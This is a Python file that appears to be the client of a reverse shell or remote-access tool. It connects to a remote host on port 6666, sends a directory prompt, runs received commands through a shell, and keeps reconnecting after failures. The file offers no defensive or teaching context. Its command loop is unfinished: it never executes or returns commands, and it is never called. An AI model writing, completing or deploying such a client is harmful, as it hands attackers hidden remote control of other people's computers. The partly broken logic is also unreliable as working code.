from client_functions import advanced_client
import socket
import subprocess
import os
import time

ip = "0.0.0.0"
hostname = socket.gethostbyaddr(ip)[0] # hostname is required
port = 6666
s = None

def connect_socket():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname,port))
    return s

def send(text):
    s.send(bytes(text, "utf-8"))

def recv(chuncks):
    return s.recv(chuncks).decode("utf-8")

def shell(cmd):
    return subprocess.run(cmd, shell=True, stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE).stdout.decode("utf-8") 

def close():
    s.close()

def process_cmd():
    current_path = str(os.getcwd())
    output = current_path + "--> "
    send(output)
    while True:
        current_path = str(os.getcwd())
        recieved = recv(1024)
        if recieved == "background":
            output = current_path + "--> "
        

def connect(s,hostname):
    
    try:
        s = connect_socket()
        
    except:
        time.sleep(1)
        connect(s,hostname)
    try:
        advanced_client(s,hostname)
    except:
        connect(s,hostname)

connect(s,hostname)